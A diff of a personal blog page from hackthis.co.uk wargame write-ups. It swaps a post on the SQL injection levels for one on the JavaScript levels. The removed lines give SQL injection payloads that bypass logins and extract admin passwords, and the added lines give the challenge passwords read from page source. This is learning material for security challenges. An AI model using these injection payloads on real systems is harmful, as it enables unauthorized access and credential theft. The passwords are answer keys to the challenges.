@@ -9,12 +9,19 @@
   <meta name="author" content="Zhengyang Song">
 
   
-  <meta name="description" content="SQLi Level 1 1
+  <meta name="description" content="Javascript Level 1 1
 2
-songzy' or 1=1 or '1'='1
-passwd SQLi Level 2 1
-https://www.hackthis.co.uk/levels/sqli/2?browse&q=a 1
-https://www.hackthis.co.uk/ &hellip;">
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+&lt;script type='text/javascript'&gt; $(function(){ $('.level-form').submit(function(e){ e. &hellip;">
   
   <meta name="keywords" content="Zhengyang Song, Technique, Blog, Programmer, Naive" />
 
@@ -110,7 +117,7 @@ MathJax.Hub.Config({
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2017/04/03/sqli/">SQLi</a></h1>
+      <h1 class="entry-title"><a href="/blog/2017/04/02/javascript/">JavaScript</a></h1>
     
     
       <p class="meta">
@@ -119,74 +126,192 @@ MathJax.Hub.Config({
 
 
 
-<time class='entry-date' datetime='2017-04-03T15:25:46+08:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2017</span></span> <span class='time'>3:25 pm</span></time>
+<time class='entry-date' datetime='2017-04-02T23:04:43+08:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2017</span></span> <span class='time'>11:04 pm</span></time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><h2>SQLi Level 1</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>songzy' or 1=1 or '1'='1
-</span><span class='line'>passwd</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>SQLi Level 2</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=a</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=%27a</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: SELECT username, admin FROM members WHERE username LIKE ''a%'</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=a%27UNION%20ALL%20SELECT%20username,%20password%20FROM%20members%20WHERE%20admin=1--</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>bellamond</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using comments to even block the rest of the query:</p>
+  <div class="entry-content"><h2>Javascript Level 1</h2>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>' OR '1'='1' --
-</span><span class='line'>' OR '1'='1' ({
-</span><span class='line'>' OR '1'='1' /* </span></code></pre></td></tr></table></div></figure>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt; 
+</span><span class='line'>$(function(){ 
+</span><span class='line'>  $('.level-form').submit(function(e){ 
+</span><span class='line'>      e.preventDefault(); 
+</span><span class='line'>      if(document.getElementById('pass').value == correct) { 
+</span><span class='line'>          document.location = '?pass=' + correct; 
+</span><span class='line'>      } else { 
+</span><span class='line'>          alert('Incorrect password') 
+</span><span class='line'>      } 
+</span><span class='line'>  })
+</span><span class='line'>})
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
 
 
 
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.hackthis.co.uk/levels/sqli/2?browse&q=a%27UNION%20ALL%20SELECT%20password,%202%20FROM%20members%20WHERE%20username=%27bellamond%27--</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'> &lt;script type='text/javascript'&gt; var correct = 'jrules' &lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 2</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt; 
+</span><span class='line'>$(function(){ 
+</span><span class='line'>  $('.level-form').submit(function(e){ 
+</span><span class='line'>      e.preventDefault(); 
+</span><span class='line'>      if ($('.level-form #pass')[0].value.length == length) { 
+</span><span class='line'>          document.location = "2?x=" + length; 
+</span><span class='line'>      } else { 
+</span><span class='line'>          alert('Incorrect Password'); 
+</span><span class='line'>      } 
+</span><span class='line'>  }); 
+</span><span class='line'>}); 
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
 
 
 
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>1b774bc166f3f8918e900fcef8752817bae76a37</span></code></pre></td></tr></table></div></figure>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt;
+</span><span class='line'>    var length = 5;
+</span><span class='line'>    var x = 3;
+</span><span class='line'>    var y = 2;
+</span><span class='line'>    y = Math.sin(118.13);
+</span><span class='line'>    y = -y;
+</span><span class='line'>    x = Math.ceil(y);
+</span><span class='line'>    y++;
+</span><span class='line'>    y = y+x+x;
+</span><span class='line'>    y *= (y/2);
+</span><span class='line'>    y++;
+</span><span class='line'>    y++;
+</span><span class='line'>    length = Math.floor(y);
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
 
 
-<p><code>Crack Station</code></p>
+<h2>Javascript Level 3</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript'&gt; 
+</span><span class='line'>var thecode = 'code123'; 
+</span><span class='line'>$(function(){ 
+</span><span class='line'>  $('.level-form').submit(function(e){ 
+</span><span class='line'>      e.preventDefault(); 
+</span><span class='line'>      if ($('.level-form #pass')[0].value == thecode) { 
+</span><span class='line'>          document.location = "?pass=" + thecode; 
+</span><span class='line'>      } else { 
+</span><span class='line'>          alert('Incorrect Password'); 
+</span><span class='line'>      } 
+</span><span class='line'>  }); 
+</span><span class='line'>}); 
+</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>getinthere</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript' src='https://hackthis-10af.kxcdn.com/files/js/min/main.js?1446747682'&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var thecode='getinthere';</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 4</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:https://www.hackthis.co.uk/levels/javascript/4</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;div class='level-form'&gt;
+</span><span class='line'>    &lt;script&gt; document.location = '?input'; &lt;/script&gt;
+</span><span class='line'>    &lt;div class='center'&gt;The password is: smellthecheese&lt;/div&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;/div&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Javascript Level 5</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:https://www.hackthis.co.uk/levels/javascript/5</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script type='text/javascript' src='https://hackthis-10af.kxcdn.com/files/js/min/extra_48d468a93b.js?1429997775'&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>a=window.location.host+"";b=a.length;c=4+((5*10)*2);d=String.fromCharCode(c,-(41-Math.floor(1806/13)),Math.sqrt(b-2)*29,(b*8)-29);p=prompt("Password:","");if(p==d){window.location="?pass="+p;}else{window.location="/levels/";}</span></code></pre></td></tr></table></div></figure>
+
 </div>
   
   
